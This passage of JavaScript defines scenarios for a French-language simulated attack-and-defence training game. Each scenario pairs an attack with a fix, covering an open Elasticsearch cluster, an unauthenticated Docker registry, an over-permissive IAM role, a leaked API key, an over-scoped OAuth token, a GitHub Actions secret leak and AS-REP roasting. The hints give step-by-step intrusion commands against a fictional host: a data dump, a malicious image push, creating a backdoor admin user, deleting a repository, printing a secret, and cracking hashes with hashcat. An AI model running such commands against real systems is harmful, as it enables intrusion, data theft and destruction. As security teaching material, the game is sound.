    who:'Vous incarnez bob, un utilisateur ayant simplement accès au réseau de target-lab.',
    desc:"Le cluster Elasticsearch de target-lab écoute sur toutes les interfaces sans le module de sécurité activé. Exfiltrez les données clients qu'il contient.",
    hints:[
      "`curl http://target-lab:9200/_cat/indices?v` liste les index sans la moindre authentification, dont un index `customers` contenant des milliers de documents.",
      "`curl http://target-lab:9200/customers/_search?size=1000` retourne le contenu intégral de cet index, y compris des données personnelles et des identifiants."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Activez le module de sécurité d'Elasticsearch afin d'exiger une authentification.",
    hints:[
      "Éditez `/etc/elasticsearch/elasticsearch.yml` avec `nano` et ajoutez la ligne `xpack.security.enabled: true`.",
      "`verify` confirme que le cluster exige désormais une authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['elasticsearch']},
      '/etc/elasticsearch':{type:'dir',perm:'755',owner:'root',children:['elasticsearch.yml']},
      '/etc/elasticsearch/elasticsearch.yml':{type:'file',perm:'644',owner:'root',size:90,
        content:"cluster.name: target-lab-cluster\nnetwork.host: 0.0.0.0\n# le module de securite n'est pas active pour l'instant\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/target-lab:9200\/_cat\/indices\?v$/, run(state, print){
        const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
        if(secured){ print('401 Unauthorized: missing authentication credentials', 'err'); return; }
        print('health status index      docs.count', 'out');
        print('yellow open   customers  15000', 'out');
      }
    },
    { pattern:/^curl\s+http:\/\/target-lab:9200\/customers\/_search\?size=1000$/, run(state, print){
        const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
        if(secured){ print('401 Unauthorized: missing authentication credentials', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.exfil = true;
        print('{"hits":[{"email":"client@target-lab.fr","carte":"4111-xxxx-xxxx-1234"}, ... ]}', 'out');
        print("[+] Données clients exfiltrées depuis un cluster Elasticsearch ouvert.", 'ok');
        print("FLAG{elasticsearch_sans_auth_exfiltration}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.exfil === true; },
  defenseCheck(state){ return /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content); },
  replay(state){
    const log=[];
    const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
    log.push({t:'$ curl http://target-lab:9200/_cat/indices?v', cls:'prompt-line'});
    if(secured){
      log.push({t:'401 Unauthorized: missing authentication credentials', cls:'err'});
      log.push({t:"[-] Le module de sécurité est activé : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'yellow open   customers  15000', cls:'ok'});
    log.push({t:'[+] Données clients exfiltrées.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 31. Registre Docker non authentifié ===================== */
{
  id:'docker-registry-unauthenticated',
  title:'Un registre Docker interne accessible sans authentification',
  category:"Chaîne d'approvisionnement (registre Docker non authentifié)",
  attack:{
    who:'Vous incarnez bob, un utilisateur ayant accès au réseau interne de target-lab.',
    desc:"Le registre Docker interne n'exige aucune authentification pour pousser une image. Publiez une image malveillante sous le tag de production : le pipeline de déploiement automatique la redéploiera avec des privilèges élevés.",
    hints:[
      "`curl http://registry.target-lab:5000/v2/_catalog` liste les dépôts du registre sans authentification : `prod-app` en fait partie.",
      "Vous avez déjà construit une image piégée en local (`evil-image`). `docker tag evil-image registry.target-lab:5000/prod-app:latest` puis `docker push registry.target-lab:5000/prod-app:latest` la publient sous le tag de production, sans qu'aucune vérification ne s'y oppose.",
      "`attendre-deploiement` simule le pipeline de déploiement continu qui redéploie automatiquement la dernière image du tag `latest`, avec des privilèges root.",
      "Terminez par `/tmp/rootbash -p` pour obtenir un shell root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
    desc:"Exigez une authentification pour pousser des images vers le registre, sans bloquer les téléchargements légitimes.",
    hints:[
      "Éditez `/etc/docker/registry-config.yml` avec `nano` et ajoutez un bloc d'authentification `htpasswd` (`auth: htpasswd: realm: basic-realm path: /etc/docker/htpasswd`).",
      "`verify` confirme que le registre exige désormais une authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['registry-config.yml']},
      '/etc/docker/registry-config.yml':{type:'file',perm:'644',owner:'root',size:120,
        content:"version: 0.1\nstorage:\n  filesystem:\n    rootdirectory: /var/lib/registry\nhttp:\n  addr: :5000\n# aucune authentification configuree pour l'instant\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/registry\.target-lab:5000\/v2\/_catalog$/, run(state, print){
        const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
        if(secured){ print('401 Unauthorized', 'err'); return; }
        print('{"repositories":["prod-app","internal-tools"]}', 'out');
      }
    },
    { pattern:/^docker\s+tag\s+evil-image\s+registry\.target-lab:5000\/prod-app:latest$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.tagged = true;
        print('', 'out');
      }
    },
    { pattern:/^docker\s+push\s+registry\.target-lab:5000\/prod-app:latest$/, run(state, print){
        const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
        if(secured){ print('401 Unauthorized: authentication required', 'err'); return; }
        if(!state.flags || !state.flags.tagged){ print("docker: image 'registry.target-lab:5000/prod-app:latest' introuvable localement.", 'err'); return; }
        state.flags.pushed = true;
        print('The push refers to repository [registry.target-lab:5000/prod-app]', 'out');
        print('latest: digest: sha256:evil0123456789 size: 1234', 'ok');
      }
    },
    { pattern:/^attendre-deploiement$/, run(state, print){
        if(!state.flags || !state.flags.pushed){
          print("[pipeline] Aucune nouvelle image détectée sur le tag latest.", 'info');
          return;
        }
        print("[pipeline] Nouvelle image détectée sur prod-app:latest, redéploiement automatique...", 'info');
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] Image piégée déployée et exécutée avec les privilèges du pipeline (root).", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via une image malveillante poussée sur le registre.", 'ok');
          print("FLAG{registre_docker_sans_auth_supply_chain}", 'flagline');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content); },
  replay(state){
    const log=[];
    const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
    log.push({t:'$ docker push registry.target-lab:5000/prod-app:latest', cls:'prompt-line'});
    if(secured){
      log.push({t:'401 Unauthorized: authentication required', cls:'err'});
      log.push({t:"[-] Le registre exige désormais une authentification : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'latest: digest: sha256:evil0123456789 size: 1234', cls:'ok'});
    log.push({t:'[+] Image malveillante redéployée automatiquement, shell root obtenu.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 32. Rôle IAM trop permissif ===================== */
{
  id:'iam-role-overpermissive',
  title:'Un rôle IAM largement trop permissif attaché à une fonction publique',
  category:'Cloud / identité (rôle IAM trop permissif)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant trouvé un point d\'entrée applicatif exposant les identifiants temporaires du rôle IAM attaché.',
    desc:"La fonction serverless publique de target-lab tourne avec un rôle IAM censé se limiter à la lecture d'un bucket, mais la politique attachée autorise `*` sur `iam:*`. Utilisez les identifiants du rôle pour créer un nouvel utilisateur IAM avec accès administrateur complet.",
    hints:[
      "`aws sts get-caller-identity --profile fn-role` confirme quel rôle est actif : `arn:aws:sts::111122223333:assumed-role/read-only-fn/session`.",
      "`aws iam simulate-principal-policy --profile fn-role --action-names iam:CreateUser` montre que l'action est autorisée alors qu'elle ne devrait pas l'être pour un rôle de lecture seule.",
      "`aws iam create-user --user-name backdoor --profile fn-role` crée un compte IAM persistant grâce à la sur-permission.",
      "`aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile fn-role` attache la politique d'administration complète au compte créé."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur cloud chargé de corriger la faille.',
    desc:"Réduisez la politique IAM attachée au rôle de la fonction au strict nécessaire (lecture seule du bucket), sans lui laisser aucun droit sur le service IAM lui-même.",
    hints:[
      "Éditez `/etc/cloud/iam-role-policy.json` avec `nano` et remplacez l'action `\"iam:*\"` par `\"s3:GetObject\"`, seule action réellement utilisée par la fonction.",
      "`verify` confirme que la politique ne référence plus aucune action `iam:*`."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cloud']},
      '/etc/cloud':{type:'dir',perm:'755',owner:'root',children:['iam-role-policy.json']},
      '/etc/cloud/iam-role-policy.json':{type:'file',perm:'644',owner:'root',size:150,
        content:"{\n  \"RoleName\": \"read-only-fn\",\n  \"Statement\": [\n    { \"Effect\": \"Allow\", \"Action\": [\"s3:GetObject\", \"iam:*\"], \"Resource\": \"*\" }\n  ]\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^aws\s+sts\s+get-caller-identity\s+--profile\s+fn-role$/, run(state, print){
        print('{"Arn": "arn:aws:sts::111122223333:assumed-role/read-only-fn/session"}', 'out');
      }
    },
    { pattern:/^aws\s+iam\s+simulate-principal-policy\s+--profile\s+fn-role\s+--action-names\s+iam:CreateUser$/, run(state, print){
        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
        print(over ? '{"EvalActionName": "iam:CreateUser", "EvalDecision": "allowed"}' : '{"EvalActionName": "iam:CreateUser", "EvalDecision": "implicitDeny"}', over ? 'out' : 'err');
      }
    },
    { pattern:/^aws\s+iam\s+create-user\s+--user-name\s+backdoor\s+--profile\s+fn-role$/, run(state, print){
        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
        if(!over){ print('An error occurred (AccessDenied) when calling the CreateUser operation', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.userCreated = true;
        print('{"User": {"UserName": "backdoor", "UserId": "AIDABACKDOOR"}}', 'ok');
      }
    },
    { pattern:/^aws\s+iam\s+attach-user-policy\s+--user-name\s+backdoor\s+--policy-arn\s+arn:aws:iam::aws:policy\/AdministratorAccess\s+--profile\s+fn-role$/, run(state, print){
        const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
        if(!over){ print('An error occurred (AccessDenied) when calling the AttachUserPolicy operation', 'err'); return; }
        if(!state.flags || !state.flags.userCreated){ print('An error occurred (NoSuchEntity): l\'utilisateur backdoor n\'existe pas.', 'err'); return; }
        state.flags.persisted = true;
        print("[+] Politique AdministratorAccess attachée au compte backdoor : persistance admin obtenue via un rôle censé être lecture seule.", 'ok');
        print("FLAG{iam_role_trop_permissif_backdoor_admin}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){ return !/"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content); },
  replay(state){
    const log=[];
    const over = /"iam:\*"/.test(state.vfs['/etc/cloud/iam-role-policy.json'].content);
    log.push({t:'$ aws iam create-user --user-name backdoor --profile fn-role', cls:'prompt-line'});
    if(!over){
      log.push({t:'An error occurred (AccessDenied) when calling the CreateUser operation', cls:'err'});
      log.push({t:"[-] Le rôle est désormais limité à la lecture du bucket : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"User": {"UserName": "backdoor"}}', cls:'ok'});
    log.push({t:'$ aws iam attach-user-policy --user-name backdoor --policy-arn .../AdministratorAccess --profile fn-role', cls:'prompt-line'});
    log.push({t:'[+] Compte administrateur persistant créé via un rôle sur-permissif.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 33. Secret applicatif poussé dans un dépôt public ===================== */
{
  id:'secret-in-public-repo',
  title:'Une clé API codée en dur, poussée par erreur dans un dépôt public',
  category:'Cloud / identité (secret exposé dans un dépôt public)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe anonyme.',
    desc:"Le dépôt public `payment-service` de target-lab contient une clé API de paiement codée en dur dans le code applicatif, au lieu d'être chargée depuis une variable d'environnement. Clonez le dépôt, retrouvez la clé, puis utilisez-la pour interroger l'API de paiement.",
    hints:[
      "`git clone https://github.com/target-lab/payment-service.git` récupère une copie locale du dépôt public.",
      "`grep -r API_KEY payment-service` retrouve la ligne où la clé est codée en dur dans le code source versionné.",
      "`curl -H 'Authorization: Bearer pk_live_9f3ac02dprodTARGETLAB' https://api.payments.target-lab/v1/charges` confirme que la clé volée fonctionne encore et donne accès à l'API de paiement en production."
    ]
  },
  defense:{
    who:'Vous incarnez désormais le développeur chargé de corriger la fuite.',
    desc:"Révoquez la clé codée en dur dans le dépôt : remplacez-la par une lecture depuis la variable d'environnement `PAYMENT_API_KEY`, pour qu'aucun secret ne reste versionné en clair.",
    hints:[
      "Éditez `payment-service/config.js` avec `nano` et remplacez la valeur codée en dur par `process.env.PAYMENT_API_KEY`.",
      "`verify` confirme qu'aucune clé en clair ne subsiste dans le fichier."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['payment-service']},
      '/home/bob/payment-service':{type:'dir',perm:'755',owner:'bob',children:['config.js']},
      '/home/bob/payment-service/config.js':{type:'file',perm:'644',owner:'bob',size:90,
        content:"module.exports = {\n  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',\n  endpoint: 'https://api.payments.target-lab/v1'\n};\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^git\s+clone\s+https:\/\/github\.com\/target-lab\/payment-service\.git$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.cloned = true;
        print("Cloning into 'payment-service'...", 'out');
        print('[+] Dépôt déjà présent localement dans ./payment-service (mise à jour simulée).', 'ok');
      }
    },
    { pattern:/^grep\s+-r\s+API_KEY\s+payment-service$/, run(state, print){
        const c = state.vfs['/home/bob/payment-service/config.js'].content;
        const leaked = /apiKey:\s*'pk_live_9f3ac02dprodTARGETLAB'/.test(c);
        if(!leaked){ print('grep: aucune correspondance', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.keyFound = true;
        print("payment-service/config.js:  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',", 'out');
      }
    },
    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+pk_live_9f3ac02dprodTARGETLAB'\s+https:\/\/api\.payments\.target-lab\/v1\/charges$/, run(state, print){
        const c = state.vfs['/home/bob/payment-service/config.js'].content;
        const leaked = /apiKey:\s*'pk_live_9f3ac02dprodTARGETLAB'/.test(c);
        if(!leaked){ print('{"error": "invalid_api_key"}', 'err'); return; }
        if(!state.flags || !state.flags.keyFound){ print("curl: clé API inconnue, retrouvez-la d'abord dans le code.", 'err'); return; }
        state.flags.charged = true;
        print('{"charges": [{"id": "ch_88213", "amount": 129900, "customer": "prod-client-771"}]}', 'ok');
        print("[+] Clé de production active retrouvée dans le code source versionné publiquement.", 'ok');
        print("FLAG{secret_code_en_dur_depot_public}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.charged === true; },
  defenseCheck(state){ return !/pk_live_9f3ac02dprodTARGETLAB/.test(state.vfs['/home/bob/payment-service/config.js'].content) && /process\.env\.PAYMENT_API_KEY/.test(state.vfs['/home/bob/payment-service/config.js'].content); },
  replay(state){
    const log=[];
    const leaked = /pk_live_9f3ac02dprodTARGETLAB/.test(state.vfs['/home/bob/payment-service/config.js'].content);
    log.push({t:'$ grep -r API_KEY payment-service', cls:'prompt-line'});
    if(!leaked){
      log.push({t:'grep: aucune correspondance', cls:'err'});
      log.push({t:"[-] La clé n'est plus codée en dur : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"payment-service/config.js:  apiKey: 'pk_live_9f3ac02dprodTARGETLAB',", cls:'ok'});
    log.push({t:'[+] Clé de production extraite du dépôt public, API de paiement interrogée.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 34. Jeton OAuth à portée trop large ===================== */
{
  id:'oauth-token-overscope',
  title:'Un jeton OAuth intégré avec une portée bien plus large que nécessaire',
  category:'Cloud / identité (jeton OAuth à portée trop large)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant intercepté un jeton OAuth destiné à une intégration de lecture de profil.',
    desc:"L'application tierce ne devait obtenir qu'une portée `profile:read`, mais le jeton délivré porte en réalité la portée `repo:admin`. Utilisez-le pour aller bien au-delà de son usage prévu : supprimez un dépôt du compte cible.",
    hints:[
      "`curl -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/oauth/scopes` révèle la portée réelle du jeton intercepté.",
      "`curl -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/user/repos` liste les dépôts accessibles bien au-delà d'un simple profil en lecture.",
      "`curl -X DELETE -H 'Authorization: Bearer oauth_tkn_5f2c_scope_all' https://api.git.target-lab/repos/target-lab/prod-core` supprime un dépôt de production grâce à la portée `repo:admin` jamais censée être accordée."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de la plateforme OAuth chargé de corriger la faille.',
    desc:"Restreignez la portée déclarée de l'application tierce à `profile:read` uniquement, conformément à son usage réel.",
    hints:[
      "Éditez `/etc/oauth/app-registration.json` avec `nano` et remplacez `\"scope\": \"repo:admin\"` par `\"scope\": \"profile:read\"`.",
      "`verify` confirme que la portée déclarée ne dépasse plus ce qui est nécessaire."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['oauth']},
      '/etc/oauth':{type:'dir',perm:'755',owner:'root',children:['app-registration.json']},
      '/etc/oauth/app-registration.json':{type:'file',perm:'644',owner:'root',size:110,
        content:"{\n  \"client_id\": \"profile-widget\",\n  \"intended_use\": \"lecture de profil utilisateur\",\n  \"scope\": \"repo:admin\"\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/oauth\/scopes$/, run(state, print){
        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
        print(over ? '{"scope": "repo:admin", "client_id": "profile-widget"}' : '{"scope": "profile:read", "client_id": "profile-widget"}', 'out');
      }
    },
    { pattern:/^curl\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/user\/repos$/, run(state, print){
        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
        if(!over){ print('{"error": "insufficient_scope"}', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.listed = true;
        print('[{"name": "prod-core", "private": true}, {"name": "internal-docs", "private": true}]', 'out');
      }
    },
    { pattern:/^curl\s+-X\s+DELETE\s+-H\s+'Authorization:\s+Bearer\s+oauth_tkn_5f2c_scope_all'\s+https:\/\/api\.git\.target-lab\/repos\/target-lab\/prod-core$/, run(state, print){
        const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
        if(!over){ print('{"error": "insufficient_scope"}', 'err'); return; }
        if(!state.flags || !state.flags.listed){ print("curl: dépôt inconnu, listez d'abord les dépôts accessibles.", 'err'); return; }
        state.flags.deleted = true;
        print('204 No Content', 'ok');
        print("[+] Dépôt de production supprimé via un jeton censé être limité à la lecture de profil.", 'ok');
        print("FLAG{oauth_scope_trop_large_suppression_depot}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.deleted === true; },
  defenseCheck(state){ return /"scope":\s*"profile:read"/.test(state.vfs['/etc/oauth/app-registration.json'].content); },
  replay(state){
    const log=[];
    const over = /"scope":\s*"repo:admin"/.test(state.vfs['/etc/oauth/app-registration.json'].content);
    log.push({t:"$ curl -X DELETE ... https://api.git.target-lab/repos/target-lab/prod-core", cls:'prompt-line'});
    if(!over){
      log.push({t:'{"error": "insufficient_scope"}', cls:'err'});
      log.push({t:"[-] La portée du jeton est désormais limitée à profile:read : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'204 No Content', cls:'ok'});
    log.push({t:'[+] Dépôt de production supprimé via une portée OAuth abusive.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 35. Secret GitHub Actions exfiltré via un workflow détourné ===================== */
{
  id:'github-actions-secret-leak',
  title:'Un secret de dépôt exfiltré via un workflow GitHub Actions détourné',
  category:'Cloud / identité (secret CI/CD exfiltré via GitHub Actions)',
  attack:{
    who:'Vous incarnez bob, un contributeur externe ayant proposé une pull request sur le dépôt public de target-lab.',
    desc:"Le workflow `.github/workflows/build.yml` se déclenche sur `pull_request_target` et exécute directement le code de la pull request, avec accès aux secrets du dépôt : une combinaison dangereuse. Modifiez le workflow pour faire fuiter le secret `DEPLOY_TOKEN` dans les logs de build.",
    hints:[
      "`cat .github/workflows/build.yml` confirme le déclencheur `pull_request_target` combiné à un accès aux secrets — le code de la pull request tourne avec les secrets du dépôt cible.",
      "Éditez `.github/workflows/build.yml` avec `nano` et ajoutez une étape `run: echo $DEPLOY_TOKEN` dans le job de build : c'est la charge utile de la pull request malveillante.",
      "`gh workflow run build.yml` déclenche l'exécution du workflow modifié, avec les secrets du dépôt cible.",
      "`gh run view --log` consulte les logs de build et révèle le secret `DEPLOY_TOKEN` en clair, imprimé par l'étape ajoutée."
    ]
  },
  defense:{
    who:'Vous incarnez désormais le mainteneur du dépôt chargé de corriger la faille.',
    desc:"Remplacez le déclencheur dangereux par `pull_request` (qui n'expose pas les secrets au code externe) pour ce workflow de build.",
    hints:[
      "Éditez `.github/workflows/build.yml` avec `nano` et remplacez `pull_request_target` par `pull_request`.",
      "`verify` confirme que le déclencheur dangereux n'est plus utilisé."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['.github']},
      '/home/bob/.github':{type:'dir',perm:'755',owner:'bob',children:['workflows']},
      '/home/bob/.github/workflows':{type:'dir',perm:'755',owner:'bob',children:['build.yml']},
      '/home/bob/.github/workflows/build.yml':{type:'file',perm:'644',owner:'bob',size:130,
        content:"on:\n  pull_request_target:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run build\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob/.github/workflows',
  exploitRules:[
    { pattern:/^cat\s+\.github\/workflows\/build\.yml$/, run(state, print){
        print(state.vfs['/home/bob/.github/workflows/build.yml'].content, 'out');
      }
    },
    { pattern:/^gh\s+workflow\s+run\s+build\.yml$/, run(state, print){
        const c = state.vfs['/home/bob/.github/workflows/build.yml'].content;
        const dangerous = /pull_request_target/.test(c);
        const payload = /echo\s+\$DEPLOY_TOKEN/.test(c);
        if(!dangerous){ print("Error: ce workflow ne se déclenche plus sur le code des pull requests externes.", 'err'); return; }
        if(!payload){ print("gh: le workflow a bien été lancé, mais aucune charge utile n'imprime le secret — modifiez d'abord build.yml.", 'err'); return; }
        state.flags = state.flags || {};
        state.flags.triggered = true;
        print('✓ Run started (run id: 918234012)', 'ok');
      }
    },
    { pattern:/^gh\s+run\s+view\s+--log$/, run(state, print){
        if(!state.flags || !state.flags.triggered){ print("gh: aucun run récent, déclenchez d'abord le workflow.", 'err'); return; }
        state.flags.leaked = true;
        print('build\tnpm run build', 'out');
        print('build\tghs_deployToken_Pr0dCICD9911', 'out');
        print("[+] Secret DEPLOY_TOKEN imprimé en clair dans les logs par le workflow détourné.", 'ok');
        print("FLAG{github_actions_pull_request_target_secret_leak}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.leaked === true; },
  defenseCheck(state){ return !/pull_request_target/.test(state.vfs['/home/bob/.github/workflows/build.yml'].content) && /pull_request:/.test(state.vfs['/home/bob/.github/workflows/build.yml'].content); },
  replay(state){
    const log=[];
    const c = state.vfs['/home/bob/.github/workflows/build.yml'].content;
    const dangerous = /pull_request_target/.test(c);
    log.push({t:'$ gh workflow run build.yml', cls:'prompt-line'});
    if(!dangerous){
      log.push({t:"Error: ce workflow ne se déclenche plus sur le code des pull requests externes.", cls:'err'});
      log.push({t:"[-] Le déclencheur pull_request_target a été remplacé : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'✓ Run started (run id: 918234012)', cls:'ok'});
    log.push({t:'$ gh run view --log', cls:'prompt-line'});
    log.push({t:'build\tghs_deployToken_Pr0dCICD9911', cls:'ok'});
    log.push({t:'[+] Secret DEPLOY_TOKEN exfiltré via le workflow détourné.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 36. AS-REP Roasting (Active Directory) ===================== */
{
  id:'ad-asrep-roasting',
  title:'Un compte sans pré-authentification Kerberos requise (AS-REP Roasting)',
  category:'Active Directory (AS-REP Roasting)',
  attack:{
    who:'Vous incarnez bob, un utilisateur du domaine sans privilège particulier, avec un simple accès réseau au contrôleur de domaine.',
    desc:"Le compte de service `svc-backup` a l'attribut « ne nécessite pas de pré-authentification Kerberos » activé par erreur. N'importe quel utilisateur du domaine peut donc demander un ticket Kerberos pour ce compte sans jamais prouver qu'il en connaît le mot de passe, et récupérer un answer chiffré avec le hash du mot de passe du compte — à casser hors-ligne.",
    hints:[
      "`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` (interrogation LDAP du domaine) liste les comptes vulnérables : `svc-backup` ressort.",
      "`asrep-roast svc-backup` simule la demande de ticket AS-REP pour ce compte précis, sans authentification préalable, et récupère le hash chiffré associé.",
      "`hashcat --mode 18200 svc-backup.asrep rockyou.txt` casse ce hash hors-ligne et révèle le mot de passe en clair du compte de service.",
      "`net use \\\\dc01\\C$ /user:svc-backup <mot_de_passe_trouvé>` confirme que le mot de passe cassé donne un accès administrateur sur le contrôleur de domaine (le compte de service y est administrateur local)."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Réactivez l'exigence de pré-authentification Kerberos sur le compte `svc-backup`, pour qu'un ticket AS-REP ne puisse plus être demandé sans prouver la connaissance du mot de passe au préalable.",
    hints:[
      "Éditez `/etc/ad/users/svc-backup.json` avec `nano` et remplacez `\"doesNotRequirePreAuth\": true` par `\"doesNotRequirePreAuth\": false`.",
      "`verify` confirme que le compte exige de nouveau la pré-authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['users']},
      '/etc/ad/users':{type:'dir',perm:'755',owner:'root',children:['svc-backup.json']},
      '/etc/ad/users/svc-backup.json':{type:'file',perm:'644',owner:'root',size:120,
        content:"{\n  \"sAMAccountName\": \"svc-backup\",\n  \"memberOf\": \"Administrateurs locaux (dc01)\",\n  \"doesNotRequirePreAuth\": true\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^Get-ADUser\s+-Filter\s+\{DoesNotRequirePreAuth\s+-eq\s+\$true\}$/, run(state, print){
        const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
        if(vuln){ print('sAMAccountName : svc-backup', 'out'); print('DoesNotRequirePreAuth : True', 'out'); }
        else { print('Aucun compte trouvé.', 'out'); }
      }
    },
